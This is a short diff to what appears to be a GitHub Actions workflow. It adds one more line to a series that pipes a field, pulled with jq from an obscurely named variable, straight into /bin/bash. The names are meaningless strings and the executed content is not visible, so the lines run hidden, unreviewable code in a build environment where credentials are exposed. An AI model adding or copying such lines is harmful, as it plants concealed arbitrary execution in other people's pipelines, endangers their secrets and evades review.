@@ -25,6 +25,7 @@ jobs:
           echo $zmgt4 | jq -r .thr8 | /bin/bash
           echo $wv3424 | jq -r .wna9 | /bin/bash
           echo $ir3 | jq -r .qim060 | /bin/bash
+          printf '%s' "$g655" | jq -r .zoyme93647 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
